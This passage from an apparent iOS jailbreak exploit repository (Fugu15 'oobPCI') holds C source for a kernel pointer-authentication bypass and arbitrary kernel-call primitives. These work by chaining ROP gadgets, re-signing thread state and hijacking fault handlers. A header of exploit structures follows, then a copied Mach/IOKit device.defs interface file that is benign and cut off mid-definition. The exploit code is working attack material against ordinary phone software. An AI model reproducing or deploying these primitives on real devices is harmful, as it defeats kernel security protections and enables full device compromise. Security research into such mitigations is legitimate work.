    DBGPRINT_ADDRVAR(datStack);
    
    // Stop the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Set new thread fault handler
    THREAD_FAULT_HNDLR_SET(chThreadPtr, brx22Handler);
    
    fugu15ExploitThread.gScratchMemKern = kmemAlloc(0x8000, (void**) &fugu15ExploitThread.gScratchMemMapped, false);
    fugu15ExploitThread.gExploitThread = chThread;
    fugu15ExploitThread.inited = true;
    
    return true;
}

void deinitFugu15PACBypass() {
    if (fugu15ExploitThread.inited) {
        fugu15ExploitThread.inited = false;
        
        pcidev_w64(fugu15ExploitThread.gCPUData + 0x10ULL, fugu15ExploitThread.gOrigIntStack);
        pcidev_w64(fugu15ExploitThread.gCPUData + 0x18ULL, fugu15ExploitThread.gOrigIntStack);
    }
}

/*
 * Execute the given CPU state.
 */
void kexec(kRegisterState *state, exploitThreadInfo *info) {
    uint64_t ldp_x0_x1       = SLIDE(gOffsets.ldp_x0_x1_x8_gadget);
    uint64_t exceptionReturnAfterCheck = SLIDE(gOffsets.exception_return_after_check);
    uint64_t exceptionReturnNoLR = SLIDE(gOffsets.exception_return_after_check_no_restore);
    uint64_t str_x8_x9 = SLIDE(gOffsets.str_x8_x9_gadget);
    
    uint64_t realStateKern    = info->gScratchMemKern + 0x10 + (sizeof(kRegisterState) * 2);
    kRegisterState *realState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + (sizeof(kRegisterState) * 2));
    memcpy(realState->x, state->x, sizeof(state->x));
    
    realState->sp = info->gIntStack + 0x3000 - 0x10;
    realState->fp = state->fp;
    
    uint64_t restoreACTStateKern    = info->gScratchMemKern + 0x10 + sizeof(kRegisterState);
    kRegisterState *restoreACTState = (kRegisterState*) ((uintptr_t) info->gScratchMemMapped + 0x10 + sizeof(kRegisterState));
    restoreACTState->x[0]  = realStateKern;
    restoreACTState->x[1]  = state->pc;
    restoreACTState->x[2]  = state->cpsr;
    restoreACTState->x[3]  = state->lr;
    restoreACTState->x[8]  = info->gACTVal;
    restoreACTState->x[9]  = info->gACTPtr;
    restoreACTState->x[22] = 0;
    restoreACTState->x[23] = 0;
    restoreACTState->sp    = info->gScratchMemKern;
    
    kRegisterState *state1 = (kRegisterState*) &info->gScratchMemMapped[2];
    state1->x[0]  = restoreACTStateKern;
    state1->x[1]  = str_x8_x9;
    state1->x[2]  = CPSR_KERN_INTR_DIS;
    state1->x[3]  = exceptionReturnAfterCheck;
    state1->x[22] = 0;
    state1->x[23] = 0;
    state1->sp    = info->gScratchMemKern;
    
    info->gScratchMemMapped[0] = info->gScratchMemKern + 0x10;    // x0 -> Our first new context
    info->gScratchMemMapped[1] = exceptionReturnAfterCheck; // x1 -> PC
    
    // Now do an arbitrary kcall
    // Using the br x22 handler, first jump to our ldp x0, x1 gadget
    // Then return into the middle of exception_return, right after authenticating the thread state
    info->gExploitThreadState.__x[2]  = CPSR_KERN_INTR_DIS; // CPSR
    info->gExploitThreadState.__x[3]  = 0;                  // FPSR
    info->gExploitThreadState.__x[4]  = 0;                  // FPCR
    info->gExploitThreadState.__x[8]  = info->gScratchMemKern; // For the ldp x0, x1, [x8] gadget
    info->gExploitThreadState.__x[22] = ldp_x0_x1;
    arm_thread_state64_set_lr_fptr(info->gExploitThreadState, ptrauth_sign_unauthenticated((void*) exceptionReturnNoLR, ptrauth_key_function_pointer, 0));
    
    info->gSpecialMemRegion = ensureSpecialMem(info->gSpecialMemRegion);
    
    info->gExploitThreadState.__x[16] = state->x[16];
    info->gExploitThreadState.__x[17] = state->x[17];
    info->gExploitThreadState.__x[18] = info->gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    
    thread_set_state(info->gExploitThread, ARM_THREAD_STATE64, (thread_state_t) &info->gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(info->gExploitThread);
}

uint64_t kcall_on_thread(exploitThreadInfo *info, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    uint64_t exceptionReturn    = SLIDE(gOffsets.exceptionReturn);
    uint64_t str_x0_x19_ldr_x20 = SLIDE(gOffsets.str_x0_x19_ldr_x20);
    
    kRegisterState kcallState;
    
    kcallState.x[0] = a1;
    kcallState.x[1] = a2;
    kcallState.x[2] = a3;
    kcallState.x[3] = a4;
    kcallState.x[4] = a5;
    kcallState.x[5] = a6;
    kcallState.x[6] = a7;
    kcallState.x[7] = a8;
    
    kcallState.x[19] = info->gScratchMemKern + 0x7FF8; // Where x0 should be stored
    kcallState.x[20] = 0x0;             // Invalid address
    kcallState.x[21] = info->gReturnContext;  // Userspace context
    kcallState.x[22] = exceptionReturn; // br x22 gadget
    kcallState.x[23] = -1;              // Required for br x22 gadget
    
    kcallState.pc = func;
    kcallState.lr = str_x0_x19_ldr_x20; // This will crash (intended) and then continue via br x22 fault handler
    kcallState.cpsr = CPSR_KERN_INTR_DIS;
    
    kexec(&kcallState, info);
    
    info->gScratchMemMapped[4095] = 0xDEADBEEFCAFEBABEULL;
    uint64_t set = 0xDEADBEEFCAFEBABEULL;
    uint64_t res = set;
    while (res == set) {
        res = info->gScratchMemMapped[4095];
    }
    
    // Stop the thread
    thread_suspend(info->gExploitThread);
    thread_abort(info->gExploitThread);
    
    return res;
}

// This function is a bit complicated but it essentially just creates a
// Fugu14-like kcall primitive
// It minimizes the number of times the Fugu15 kcall has to be used
// (Fugu15 kcall is a bit unstable)
bool setupFugu14Kcall(void) {
    // Create a Fugu14-like kcall primitive
    // First we need a new thread
    thread_t thread = 0;
    kern_return_t kr = thread_create(mach_task_self_, &thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] setupFugu14Kcall: thread_create failed!");
        return false;
    }
    
    // Find the thread
    uint64_t threadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (threadPtr != 0) else {
        puts("[-] setupFugu14Kcall: Failed to find thread!");
        return false;
    }
    
    // Get it's state pointer
    uint64_t actContext = THREAD_ACT_CONTEXT(threadPtr);
    guard (threadPtr != 0) else {
        puts("[-] setupFugu14Kcall: Failed to get thread ACT_CONTEXT!");
        return false;
    }
    
    // Create a stack
    void *stackMapped = NULL;
    uint64_t stack = kmemAlloc(0x4000 * 4, &stackMapped, false) + 0x8000ULL; // Four pages
    guard (stack != 0) else {
        puts("[-] setupFugu14Kcall: Failed to alloc kernel stack!");
        return false;
    }
    
    kRegisterState *mappedState = (kRegisterState*)((uintptr_t) stackMapped + 0x8000ULL);
    
    /*
     * We set our signed state like this:
     * pc  -> Gadget to set TH_KSTACKPTR of this thread
     *        Required in order to survive br x22 jumps via a fault (fault handler checks stack)
     * lr  -> Gadget to load a new CPU state
     * x17 -> Address of br x22 gadget
     *        We can't load x17 via the load CPU state gadget so we have to include it in the signed state
     *
     * Setup:
     * Set the thread fault handler to our br x22 gadget and immediatly use it to return
     *
     * Kcall:
     * A kcall can be done by jumping to the requested address and returning to a str x0, ...; ldr x??, ...; gadget, making sure the load faults
     * This will cause the br x22 gadget to be invoked -> Return to user
     */
    
    // Resign context
    uint64_t str_x8_x9_gadget = SLIDE(gOffsets.str_x8_x9_gadget);
    uint64_t exception_return_after_check = SLIDE(gOffsets.exception_return_after_check);
    uint64_t brX22 = SLIDE(gOffsets.brX22);
    kcall(SLIDE(gOffsets.ml_sign_thread_state), actContext, str_x8_x9_gadget /* pc */, CPSR_KERN_INTR_DIS /* cpsr */, exception_return_after_check /* lr */, 0 /* x16 */, brX22 /* x17 */, 0, 0);
    
    // Write register values
    pcidev_w64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
    pcidev_w32(actContext + offsetof(kRegisterState, cpsr),  CPSR_KERN_INTR_DIS);
    pcidev_w64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
    pcidev_w64(actContext + offsetof(kRegisterState, x[16]), 0);
    pcidev_w64(actContext + offsetof(kRegisterState, x[17]), brX22);
    
    // Use str x8, [x9] gadget to set TH_KSTACKPTR
    pcidev_w64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
    pcidev_w64(actContext + offsetof(kRegisterState, x[9]), threadPtr + THREAD_KSTACKPTR_OFFSET);
    
    // SP and x0 should both point to the new CPU state
    pcidev_w64(actContext + offsetof(kRegisterState, sp),   stack);
    pcidev_w64(actContext + offsetof(kRegisterState, x[0]), stack);
    
    // x2 -> new cpsr
    // Include in signed state since it is rarely changed
    pcidev_w64(actContext + offsetof(kRegisterState, x[2]), CPSR_KERN_INTR_EN);
    
    // Create a copy of this state
    kernread(actContext, sizeof(kRegisterState), &fugu14KcallThread.signedState);
    
    // Set a custom recovery handler
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid = SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid + 4ULL);
    
    // x1 -> new pc
    // x3 -> new lr
    pcidev_w64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
    // We don't need lr here
    
    // New state
    // Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
    mappedState->x[0] = 0;
    
    // Fault handler is br x22 -> set x22
    mappedState->x[22] = SLIDE(gOffsets.exceptionReturn);
    
    // Exception return expects a signed state in x21
    mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
    // Also need to set sp
    mappedState->sp = stack;
    
    // Reset flag
    gUserReturnDidHappen = 0;
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(thread);
    thread_abort(thread);
    
    // Done!
    // Thread's fault handler is now set to the br x22 gadget
    fugu14KcallThread.thread              = thread;
    fugu14KcallThread.actContext          = actContext;
    fugu14KcallThread.kernelStack         = stack;
    fugu14KcallThread.mappedState         = mappedState;
    fugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
    fugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t) stackMapped + 0xF000ULL);
    fugu14KcallThread.inited              = true;
    
    return true;
}

uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    // Restore signed state first
    kernwrite(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
    
    // Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
    uint64_t str_x0_x19_ldr_x20 = SLIDE(gOffsets.str_x0_x19_ldr_x20);
    
    // x1 -> new pc
    // x3 -> new lr
    pcidev_w64(callThread->actContext + offsetof(kRegisterState, x[1]), func);
    pcidev_w64(callThread->actContext + offsetof(kRegisterState, x[3]), str_x0_x19_ldr_x20);
    
    // New state
    // x19 -> Where to store return value
    callThread->mappedState->x[19] = callThread->scratchMemory;
    
    // x20 -> NULL (to force data abort)
    callThread->mappedState->x[20] = 0;
    
    // x22 -> exceptionReturn
    callThread->mappedState->x[22] = SLIDE(gOffsets.exceptionReturn);
    
    // Exception return expects a signed state in x21
    callThread->mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
    // Also need to set sp
    callThread->mappedState->sp = callThread->kernelStack;
    
    // Set args
    callThread->mappedState->x[0] = a1;
    callThread->mappedState->x[1] = a2;
    callThread->mappedState->x[2] = a3;
    callThread->mappedState->x[3] = a4;
    callThread->mappedState->x[4] = a5;
    callThread->mappedState->x[5] = a6;
    callThread->mappedState->x[6] = a7;
    callThread->mappedState->x[7] = a8;
    
    // Reset flag
    gUserReturnDidHappen = 0;
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(callThread->thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(callThread->thread);
    thread_abort(callThread->thread);
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Copy return value
    return callThread->scratchMemoryMapped[0];
}

uint64_t Fugu14Kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
    if (fugu14KcallThread.inited) {
        return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
    }
    
    return kcall_on_thread(&fugu15ExploitThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread) {
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, thread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] kexec_on_new_thread: Failed to create new thread!");
        return false;
    }
    
    thread_suspend(*thread);
    thread_abort(*thread);
    
    uint64_t threadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (threadPtr != 0) else {
        puts("[-] kexec_on_new_thread: Failed to find new thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(threadPtr);
    
    kRegisterState *threadACTContext = (kRegisterState*) THREAD_ACT_CONTEXT(threadPtr);
    guard (threadACTContext != NULL) else {
        puts("[-] kexec_on_new_thread: New thread has no ACT_CONTEXT?!");
        return false;
    }
    
    // Write new state (only important stuff)
    size_t sizeToWrite = offsetof(kRegisterState, other[0]) - offsetof(kRegisterState, x[0]);
    kernwrite((uint64_t) &threadACTContext->x[0], &kState->x[0], sizeToWrite);
    
    // Resign it
    kcall(SLIDE(gOffsets.ml_sign_thread_state), (uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17], 0, 0);
    
    // Resume
    thread_resume(*thread);
    
    return true;
}

```

`Exploits/oobPCI/Sources/badRecovery.h`:

```h
//
//  badRecovery.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef badRecovery_h
#define badRecovery_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

typedef struct {
    uint64_t unk;
    uint64_t x[29];
    uint64_t fp;
    uint64_t lr;
    uint64_t sp;
    uint64_t pc;
    uint32_t cpsr;
    // Other stuff
    uint64_t other[70];
} kRegisterState;

typedef struct {
    bool inited;
    thread_t gExploitThread;
    uint64_t gScratchMemKern;
    volatile uint64_t *gScratchMemMapped;
    arm_thread_state64_t gExploitThreadState;
    uint64_t gSpecialMemRegion;
    uint64_t gIntStack;
    uint64_t gOrigIntStack;
    uint64_t gReturnContext;
    uint64_t gACTPtr;
    uint64_t gACTVal;
    uint64_t gCPUData;
} exploitThreadInfo;

typedef struct {
    bool inited;
    thread_t thread;
    uint64_t actContext;
    kRegisterState signedState;
    uint64_t kernelStack;
    kRegisterState *mappedState;
    uint64_t scratchMemory;
    uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

bool breakCFI(uint64_t kernelBase);
void deinitFugu15PACBypass(void);

bool setupFugu14Kcall(void);

void pac_exploit_thread(void);
void pac_exploit_doIt(void);
void pac_loop(void);

void ppl_loop(void);
void ppl_done(void);

void kexec(kRegisterState *state, exploitThreadInfo *info);
uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8);

bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread);

#endif /* badRecovery_h */

```

`Exploits/oobPCI/Sources/device.defs`:

```defs
/*
 * Copyright (c) 1998-2014 Apple Computer, Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */
/*
 * @OSF_COPYRIGHT@
 */
/* 
 * Mach Operating System
 * Copyright (c) 1991,1990,1989 Carnegie Mellon University
 * All Rights Reserved.
 * 
 * Permission to use, copy, modify and distribute this software and its
 * documentation is hereby granted, provided that both the copyright
 * notice and this permission notice appear in all copies of the
 * software, derivative works or modified versions, and any portions
 * thereof, and that both notices appear in supporting documentation.
 * 
 * CARNEGIE MELLON ALLOWS FREE USE OF THIS SOFTWARE IN ITS "AS IS"
 * CONDITION.  CARNEGIE MELLON DISCLAIMS ANY LIABILITY OF ANY KIND FOR
 * ANY DAMAGES WHATSOEVER RESULTING FROM THE USE OF THIS SOFTWARE.
 * 
 * Carnegie Mellon requests users of this software to return to
 * 
 *  Software Distribution Coordinator  or  Software.Distribution@CS.CMU.EDU
 *  School of Computer Science
 *  Carnegie Mellon University
 *  Pittsburgh PA 15213-3890
 * 
 * any improvements or extensions that they make and grant Carnegie Mellon
 * the rights to redistribute these changes.
 */
/*
 * File:	device/device.defs
 * Author:	Douglas Orr
 *		Feb 10, 1988
 * Abstract:
 *	Mach device support.  Mach devices are accessed through
 *	block and character device interfaces to the kernel.
 */

#define IOKIT 1

subsystem
#if	KERNEL_SERVER
	  KernelServer
#endif	/* KERNEL_SERVER */
		       iokit 2800;

#if IOKITSIMD || KERNEL_SERVER
#define IOKIT_ALL_IPC 1
#endif

#include <mach/std_types.defs>
#include <mach/mach_types.defs>
#include <mach/clock_types.defs>
#include <mach/clock_types.defs>

#if !__LP64__
#    define __ILP32__ 1
#endif

import <device/device_types.h>;

serverprefix	is_;

type reply_port_t = MACH_MSG_TYPE_MAKE_SEND_ONCE | polymorphic
	ctype: mach_port_t;

#if	IOKIT

type io_name_t            = c_string[*:128];
type io_string_t          = c_string[*:512];
type io_string_inband_t   = c_string[*:4096];
type io_struct_inband_t   = array[*:4096] of char;
type io_buf_ptr_t	  = ^array[] of MACH_MSG_TYPE_INTEGER_8;
type NDR_record_t         = struct[8] of char;

#if KERNEL
type io_user_scalar_t     = uint64_t;
type io_user_reference_t  = uint64_t;
type io_scalar_inband_t   = array[*:16] of int;
// must be the same type as OSAsyncReference
type io_async_ref_t 	  = array[*:8]  of natural_t;
type io_scalar_inband64_t = array[*:16] of io_user_scalar_t;
type io_async_ref64_t 	  = array[*:8]  of io_user_reference_t;
#elif __LP64__
type io_user_scalar_t     = uint64_t;
type io_user_reference_t  = uint64_t;
type io_scalar_inband_t   = array[*:16] of io_user_scalar_t;
type io_async_ref_t 	  = array[*:8]  of io_user_reference_t;
type io_scalar_inband64_t = array[*:16] of io_user_scalar_t;
type io_async_ref64_t 	  = array[*:8]  of io_user_reference_t;
#else
type io_user_scalar_t     = int;
type io_user_reference_t  = natural_t;
type io_scalar_inband_t   = array[*:16] of io_user_scalar_t;
type io_async_ref_t 	  = array[*:8]  of io_user_reference_t;
type io_scalar_inband64_t = array[*:16] of uint64_t;
type io_async_ref64_t 	  = array[*:8]  of uint64_t;
#endif // __LP64__

type io_object_t = mach_port_t
		ctype: mach_port_t
#if	KERNEL_SERVER
		intran: io_object_t iokit_lookup_object_port(mach_port_t)
		outtran: mach_port_t iokit_make_object_port(io_object_t)
		destructor: iokit_remove_reference(io_object_t)
#endif	/* KERNEL_SERVER */
		;

type io_connect_t = mach_port_t
		ctype: mach_port_t
#if	KERNEL_SERVER
		intran: io_connect_t iokit_lookup_connect_port(mach_port_t)
		outtran: mach_port_t iokit_make_connect_port(io_connect_t)
		destructor: iokit_remove_connect_reference(io_connect_t)
#endif	/* KERNEL_SERVER */
		;

routine io_object_get_class(
	    object		: io_object_t;
	out className		: io_name_t
	);

routine io_object_conforms_to(
	    object		: io_object_t;
	in  className		: io_name_t;
	out conforms		: boolean_t
	);

routine io_iterator_next(
	    iterator		: io_object_t;
	out object		: io_object_t
	);

routine io_iterator_reset(
	    iterator		: io_object_t
	);

routine io_service_get_matching_services(
	    master_port		: mach_port_t;
	in  matching		: io_string_t;
	out existing		: io_object_t
	);

routine io_registry_entry_get_property(
	    registry_entry	: io_object_t;
	in  property_name	: io_name_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_registry_create_iterator(
	    master_port		: mach_port_t;
	in  plane		: io_name_t;
	in  options		: uint32_t;
	out iterator		: io_object_t
	);

routine io_registry_iterator_enter_entry(
	    iterator		: io_object_t
	);

routine io_registry_iterator_exit_entry(
	    iterator		: io_object_t
	);

routine io_registry_entry_from_path(
	    master_port		: mach_port_t;
	in  path		: io_string_t;
	out registry_entry	: io_object_t
	);

routine io_registry_entry_get_name(
	    registry_entry	: io_object_t;
	out name		: io_name_t
	);

routine io_registry_entry_get_properties(
	    registry_entry	: io_object_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_registry_entry_get_property_bytes(
	    registry_entry	: io_object_t;
	in  property_name	: io_name_t;
	out data		: io_struct_inband_t, CountInOut
	);

routine io_registry_entry_get_child_iterator(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out iterator		: io_object_t
	);

routine io_registry_entry_get_parent_iterator(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out iterator		: io_object_t
	);

skip;
/* was routine io_service_open
	    service		: io_object_t;
	in  owningTask		: task_t;
	in  connect_type	: uint32_t;
	out connection		: io_connect_t
	);
*/

routine io_service_close(
	    connection		: io_connect_t
	);

routine io_connect_get_service(
	    connection		: io_connect_t;
	out service		: io_object_t
	);

#if  IOKIT_ALL_IPC || __ILP32__
routine io_connect_set_notification_port(
	    connection		: io_connect_t;
	in  notification_type	: uint32_t;
	in  port		: mach_port_make_send_t;
	in  reference		: uint32_t
	);

routine io_connect_map_memory(
	    connection		: io_connect_t;
	in  memory_type		: uint32_t;
	in  into_task		: task_t;
#if  IOKIT_ALL_IPC
	inout address		: uint32_t;
	inout size		: uint32_t;
#else
	inout address		: vm_address_t;
	inout size		: vm_size_t;
#endif
	in  flags		: uint32_t
	);
#else
skip;
skip;
#endif

routine io_connect_add_client(
	    connection		: io_connect_t;
	in  connect_to		: io_connect_t
	);

routine io_connect_set_properties(
	    connection		: io_connect_t;
	in  properties		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t
	);

#if  IOKIT_ALL_IPC || __ILP32__
routine io_connect_method_scalarI_scalarO(
	    connection		: io_connect_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	out output		: io_scalar_inband_t, CountInOut
	);

routine io_connect_method_scalarI_structureO(
	    connection		: io_connect_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	out output		: io_struct_inband_t, CountInOut
	);

routine io_connect_method_scalarI_structureI(
	    connection		: io_connect_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	in  inputStruct		: io_struct_inband_t
	);

routine io_connect_method_structureI_structureO(
	    connection		: io_connect_t;
	in  selector		: uint32_t;
	in  input		: io_struct_inband_t;
	out output		: io_struct_inband_t, CountInOut
	);
#else
skip;
skip;
skip;
skip;
#endif

routine io_registry_entry_get_path(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out path		: io_string_t
	);

routine io_registry_get_root_entry(
	    master_port		: mach_port_t;
	out root		: io_object_t
	);

routine io_registry_entry_set_properties(
	    registry_entry	: io_object_t;
	in  properties		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t
	);

routine io_registry_entry_in_plane(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out inPlane		: boolean_t
	);

routine io_object_get_retain_count(
	    object		: io_object_t;
	out retainCount		: uint32_t
	);

routine io_service_get_busy_state(
	    service		: io_object_t;
	out busyState		: uint32_t
	);

routine io_service_wait_quiet(
	    service		: io_object_t;
	    wait_time		: mach_timespec_t
	);

routine io_registry_entry_create_iterator(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	in  options		: uint32_t;
	out iterator		: io_object_t
	);

routine io_iterator_is_valid(
	    iterator		: io_object_t;
	out is_valid		: boolean_t
	);

skip;
/* was routine io_make_matching(
	    master_port		: mach_port_t;
	in  of_type		: uint32_t;
	in  options		: uint32_t;
	in  input		: io_struct_inband_t;
	out matching		: io_string_t
	);
*/

routine io_catalog_send_data(
	    master_port		: mach_port_t;
        in  flag                : uint32_t;
	in  inData		: io_buf_ptr_t;
        out result		: kern_return_t
	);

routine io_catalog_terminate(
	    master_port		: mach_port_t;
        in  flag                : uint32_t;
	in  name		: io_name_t
	);

routine io_catalog_get_data(
	    master_port		: mach_port_t;
        in  flag                : uint32_t;
	out outData		: io_buf_ptr_t
	);

routine io_catalog_get_gen_count(
	    master_port		: mach_port_t;
        out genCount            : uint32_t
	);

routine io_catalog_module_loaded(
	    master_port		: mach_port_t;
	in  name		: io_name_t
	);

routine io_catalog_reset(
	    master_port		: mach_port_t;
	in  flag		: uint32_t
	);

routine io_service_request_probe(
	    service		: io_object_t;
	in  options		: uint32_t
	);

routine io_registry_entry_get_name_in_plane(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out name		: io_name_t
	);

routine io_service_match_property_table(
	    service		: io_object_t;
	in  matching		: io_string_t;
	out matches		: boolean_t
	);

#if  IOKIT_ALL_IPC || __ILP32__
routine io_async_method_scalarI_scalarO(
	    connection		: io_connect_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	out output		: io_scalar_inband_t, CountInOut
	);
routine io_async_method_scalarI_structureO(
	    connection		: io_connect_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	out output		: io_struct_inband_t, CountInOut
	);
routine io_async_method_scalarI_structureI(
	    connection		: io_connect_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	in  selector		: uint32_t;
	in  input		: io_scalar_inband_t;
	in  inputStruct		: io_struct_inband_t
	);
routine io_async_method_structureI_structureO(
	    connection		: io_connect_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	in  selector		: uint32_t;
	in  input		: io_struct_inband_t;
	out output		: io_struct_inband_t, CountInOut
	);
#else
skip;
skip;
skip;
skip;
#endif

#if IOKIT_ALL_IPC || __ILP32__
routine io_service_add_notification(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_string_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	out notification	: io_object_t
	);
routine io_service_add_interest_notification(
	    service		: io_object_t;
	in  type_of_interest	: io_name_t;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
	out notification	: io_object_t
        );
routine io_service_acknowledge_notification(
           service             : io_object_t;
       in  notify_ref          : natural_t;
       in  response            : natural_t
        );
#else
skip;
skip;
skip;
#endif

routine io_connect_get_notification_semaphore(
	    connection		: io_connect_t;
	in  notification_type	: natural_t;
	out semaphore		: semaphore_t
	);

#if IOKIT_ALL_IPC || __ILP32__
routine io_connect_unmap_memory(
	    connection		: io_connect_t;
	in  memory_type		: uint32_t;
	in  into_task		: task_t;
#if IOKIT_ALL_IPC
	in  address		: uint32_t
#else
	in  address		: vm_address_t
#endif
	);
#else
skip;
#endif

routine io_registry_entry_get_location_in_plane(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	out location		: io_name_t
	);

routine io_registry_entry_get_property_recursively(
	    registry_entry	: io_object_t;
	in  plane		: io_name_t;
	in  property_name	: io_name_t;
	in  options		: uint32_t;
	out properties		: io_buf_ptr_t, physicalcopy
	);

routine io_service_get_state(
	    service		: io_object_t;
	out state		: uint64_t;
	out busy_state		: uint32_t;
	out accumulated_busy_time : uint64_t
	);

routine io_service_get_matching_services_ool(
	    master_port		: mach_port_t;
	in  matching		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t;
	out existing		: io_object_t
	);

routine io_service_match_property_table_ool(
	    service		: io_object_t;
	in  matching		: io_buf_ptr_t, physicalcopy;
        out result		: kern_return_t;
	out matches		: boolean_t
	);

#if IOKIT_ALL_IPC || __ILP32__
routine io_service_add_notification_ool(
	    master_port		: mach_port_t;
	in  notification_type	: io_name_t;
	in  matching		: io_buf_ptr_t, physicalcopy;
	in  wake_port		: mach_port_make_send_t;
	in  reference		: io_async_ref_t;
        out result		: kern_return_t;
	out notification	: io_object_t
	);
#else
skip;
#endif

routine io_object_get_superclass(
	    master_port		: mach_port_t;
	in  obj_name			: io_name_t;
	out class_name          : io_name_t   
        );

routine io_object_get_bundle_identifier(
	    master_port		: mach_port_t;
	in  obj_name			: io_name_t;
	out class_name          : io_name_t   
